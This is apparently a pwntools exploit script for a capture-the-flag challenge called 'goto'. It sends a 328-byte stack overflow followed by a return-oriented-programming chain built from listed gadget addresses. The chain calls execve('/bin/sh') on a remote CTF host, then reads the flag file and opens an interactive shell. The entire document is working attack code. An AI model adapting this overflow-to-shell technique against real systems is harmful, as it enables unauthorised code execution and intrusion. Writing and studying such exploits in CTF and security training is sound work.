from pwn import *
context.arch = 'amd64'
# r = process("./goto")
r = remote('csie.ctf.tw',10128)
'''
all gadget I used.
0x0000000000404971 : pop rax ; ret
0x00000000004071e5 : pop rdx ; or dh, dh ; ret
0x000000000044f3ae : movsxd rsi, eax ; ret
0x0000000000423e55 : syscall
0x000000000044ee6f : mov qword ptr [rdi], rax ; ret
'''
ropchain = [
	# setting rdi to ptr to /bin/sh
	p64(0x0000000000404971),	# pop rax; ret
	b"/bin/sh\x00",				# well, it's just a string gave rax.
	p64(0x000000000044ee6f),	# mov qword ptr [rdi], rax ; ret
	# setting rdx
	p64(0x00000000004071e5), 	# pop rdx ; or dh, dh ; ret
	p64(0x0),					# set rdx to 0
	# setting rsi
		# setting pop_rax
		p64(0x0000000000404971),# pop rax ; ret
		p64(0x0),				# rax = 0
	p64(0x000000000044f3ae),	# movsxd rsi, eax ; ret
	# setting rax
	p64(0x0000000000404971),	# pop rax ; ret
	p64(0x3b),					# rax = 3b (syscall)
	# call syscall
	p64(0x0000000000423e55) 	# syscall
]
import time
r.sendline(b'\x00'*328 + b''.join(ropchain) + b'\n')
time.sleep(0.5)
r.sendline('OAO\n')
time.sleep(0.5)
r.sendline('cat /home/goto/flag')
r.interactive()